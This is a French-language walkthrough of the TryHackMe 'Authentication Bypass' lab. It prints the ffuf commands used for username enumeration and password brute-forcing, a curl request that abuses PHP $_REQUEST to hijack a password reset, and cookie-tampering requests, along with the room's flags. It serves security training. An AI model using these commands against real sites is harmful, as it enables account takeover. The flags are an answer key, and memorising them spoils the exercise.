# 🔐 TryHackMe – Authentication Bypass

Dans cette room, nous explorons différentes façons de contourner ou casser les mécanismes d'authentification sur un site web. On y découvre des failles comme :
- L’énumération de comptes
- Le bruteforce
- Les erreurs logiques (logic flaws)
- Le cookie tampering
- Le déchiffrement ou encodage de sessions

---

## 🧩 Task 1 – Introduction

> **But** : Comprendre que les failles d’authentification sont souvent critiques car elles permettent d'accéder à des comptes utilisateurs ou d’administrateurs.

✅ *Aucune question dans cette étape*

---

## 🧩 Task 2 – Username Enumeration

**URL ciblée** : `http://10.10.60.101/customers/signup`  
**Erreur visible** : `"username already exists"`

### 🔧 Commande ffuf utilisée :
```bash
ffuf -w /usr/share/seclists/Usernames/Names/names.txt \
-X POST -d "username=FUZZ&email=x&password=x&cpassword=x" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u http://10.10.60.101/customers/signup \
-mr "username already exists"
````

### ✅ Usernames trouvés :

* admin
* robert
* simon
* steve

➡️ Ajoutés dans `valid_usernames.txt`

### 📌 Réponses :

* 2.1. **simon**
* 2.2. **steve**
* 2.3. **robert**

---

## 🧩 Task 3 – Brute Force

**URL ciblée** : `http://10.10.60.101/customers/login`
**Wordlists utilisées** :

* Usernames : `valid_usernames.txt`
* Passwords : `10-million-password-list-top-100.txt`

### 🔧 Bruteforce combiné :

```bash
ffuf -w valid_usernames.txt:W1,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
-X POST -d "username=W1&password=W2" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u http://10.10.60.101/customers/login \
-fc 200
```

### ✅ Résultat trouvé :

* 3.1. **steve/thunder**

---

## 🧩 Task 4 – Logic Flaw (PHP $\_REQUEST Abuse)

**Cible** : `http://10.10.60.101/customers/reset`

> L'application utilise `$_REQUEST`, ce qui permet d'**écraser l'adresse email** de l'utilisateur dans la requête de reset.

### 🔧 Exploit :

1. Créer un compte avec : `toto@customer.acmeitsupport.thm`
2. Lancer :

```bash
curl 'http://10.10.60.101/customers/reset?email=robert@acmeitsupport.thm' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d 'username=robert&email=toto@customer.acmeitsupport.thm'
```

3. Se connecter avec `toto`, ouvrir les tickets → clic sur le lien de login auto en tant que **Robert**

### ✅ Réponse :

* 4.1. **THM{AUTH\_BYPASS\_COMPLETE}**

---

## 🧩 Task 5 – Cookie Tampering

### 🔧 Requête initiale :

```bash
curl http://10.10.60.101/cookie-test
```

➡️ Réponse : `Not Logged In`

---

### 🔧 Requête avec cookie utilisateur :

```bash
curl -H "Cookie: logged_in=true; admin=false" http://10.10.60.101/cookie-test
```

➡️ Réponse : `Logged In As A User`

---

### 🔧 Requête avec cookie admin :

```bash
curl -H "Cookie: logged_in=true; admin=true" http://10.10.60.101/cookie-test
```

➡️ Réponse + flag : `Logged In As An Admin`

### ✅ Réponse :

* 5.1. **THM{COOKIE\_TAMPERING}**

---

## 🔐 Bonus – Hash & Encodage

### 5.2. MD5 hash

```text
3b2a1053e3270077456a79192070aa78 → 463729
```

Réponse : **463729**

---

### 5.3. Base64 decode

```bash
echo 'VEhNe0JBU0U2NF9FTkNPRElOR30=' | base64 -d
```

Résultat : **THM{BASE64\_ENCODING}**

---

### 5.4. Base64 encode

```bash
echo -n '{"id":1,"admin":true}' | base64
```

Résultat : **eyJpZCI6MSwiYWRtaW4iOnRydWV9**

---

## ✅ Résumé des flags

| Étape    | Flag                           |
| -------- | ------------------------------ |
| Task 3   | `steve/thunder`                |
| Task 4   | `THM{AUTH_BYPASS_COMPLETE}`    |
| Task 5.1 | `THM{COOKIE_TAMPERING}`        |
| Task 5.2 | `463729`                       |
| Task 5.3 | `THM{BASE64_ENCODING}`         |
| Task 5.4 | `eyJpZCI6MSwiYWRtaW4iOnRydWV9` |

---

### 🧠 Concepts clés retenus

* `ffuf` permet d’énumérer et bruteforcer efficacement des endpoints web
* `$_REQUEST` en PHP est dangereux s’il est mal utilisé
* Des cookies modifiables en clair peuvent conduire à une élévation de privilèges
* Base64 n’est **pas une sécurité**, juste un encodage lisible


